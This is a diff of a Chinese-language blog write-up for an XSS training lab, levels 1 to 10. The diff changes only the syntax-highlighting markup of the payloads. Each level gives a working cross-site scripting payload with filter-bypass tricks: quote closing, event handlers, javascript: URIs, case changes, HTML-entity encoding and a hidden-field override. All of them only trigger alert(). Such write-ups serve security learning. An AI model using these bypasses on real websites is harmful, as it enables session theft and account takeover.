@@ -402,53 +402,53 @@
 <p>题目 payload不唯一呦</p>
 <a id="more"></a>
 <h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>没有任何过滤</p>
-<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>记得以前xss这里曾请教过国光哥一些姿势</p>
 <p>先输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert("xss")&gt;</span><br></pre></td></tr></table></figure>
 <p>查看源码发现 value的值里使用了双引号 所以想到闭合前面的双引号。</p>
 <p><img src="https://i.loli.net/2019/03/01/5c788f690d578.png" alt="屏幕快照 2019-03-01 上午9.47.12.png"></p>
-<h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>"<span class="attr">xss</span>")&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="涉及基础"><a href="#涉及基础" class="headerlink" title="涉及基础"></a>涉及基础</h3><p>img为图片标签 src应该填写图片地址 如果图片地址不存在 就会触发onerror事件弹出xss</p>
 <h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>试探性输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert("xss")&gt;</span><br></pre></td></tr></table></figure>
 <p>查看源代码发现两端括号被实体化了 换个姿势</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onclick</span>=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p>右键源代码 发现本身并没有被过滤 但是value里面使用了单引号 闭合就好</p>
-<h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘&gt;onclick=&apos;alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘&gt;onclick=<span class="symbol">'alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>与level3类似</p>
 <p>这题目value里面使用了双引号 闭合双引号就ok</p>
-<h3 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onclick="</span>alert(<span class="number">1</span>)<span class="string">"</span></span><br></pre></td></tr></table></figure>
 <h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>参考前面 直接输入payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onclick</span>=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p>发现被过滤 大小写无法绕过 换个姿势</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=javascript:alert(<span class="string">"xss"</span>)&gt;</span><br></pre></td></tr></table></figure>
 <p>这时候查看源代码发现本身并没有过滤 都是一个套路闭合一下双引号即可</p>
-<h3 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href=javascript:alert("</span>xss<span class="string">")&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>这题目前有点坑 与上题相似 单过滤了href src等属性 </p>
 <p>这里考虑到可以用大小写绕过 </p>
-<h3 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img SRC=1 ONERROR=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">SRC</span>=<span class="string">1</span> <span class="attr">ONERROR</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>随便写个payload </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onclick</span>=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p>查看源代码发现 value有双引号 首先考虑到闭合</p>
 <p>其次on被过滤为空 估计不会进行二次过滤</p>
-<h3 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onclick="</span>alert<span class="comment">(1)</span></span><br></pre></td></tr></table></figure>
 <h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>添加超链接到页面 本身在a标签里面所以我们payload如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Javascript:</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p>发现并没弹窗 查看源代码发现javascript被过滤 试了很多都被过滤</p>
 <p>想到html有字解码机制 试一下将过滤关键字实体化</p>
 <p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">字符实体转换</a></p>
-<h3 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span>&amp;<span class="selector-id">#115</span>;<span class="selector-tag">cript</span><span class="selector-pseudo">:alert(1)</span></span><br></pre></td></tr></table></figure>
 <h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>这里始终不知道是怎么回事 看了xz的wp 得知这题自动检测url 如果发现没有带 http:// 则会显示不合法</p>
 <p>还发现了过滤了双引号 还是利用html自解码机制将关键字实例化即可绕过</p>
-<h3 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&amp;#34;http://&amp;#34;)</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span><span class="selector-tag">&amp;</span><span class="selector-id">#115</span>;<span class="selector-tag">cript</span><span class="selector-pseudo">:alert(</span><span class="selector-tag">&amp;</span><span class="selector-id">#34</span>;<span class="selector-tag">http</span>:<span class="comment">//&amp;#34;)</span></span><br></pre></td></tr></table></figure>
 <h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>这题刚打开是懵逼的 </p>
 <p>然后又请教了国光哥<img src="https://i.loli.net/2019/03/01/5c791e45cb43a.gif" alt="7AFA3AE488BF6843C3F551094D258D15.gif"></p>
 <p>右键查看源文件 发现了三个隐藏参数 经过一个个试。</p>
 <p>发现t_sort参数是控的 由于<code>type=&quot;hidden&quot;</code>是隐藏的</p>
 <p>on事件无效</p>
 <p>所以应破坏掉type的hidden 之后利用 onclick 弹窗</p>
-<h3 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&amp;t_sort=233%22%20onclick=alert(233)%20type=%22%22</span><br></pre></td></tr></table></figure>
+<h3 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=<span class="number">1</span>&amp;t_sort=<span class="number">233</span>%<span class="number">22</span>%<span class="number">20</span>onclick=alert(<span class="number">233</span>)%<span class="number">20</span>type=%<span class="number">22</span>%<span class="number">22</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
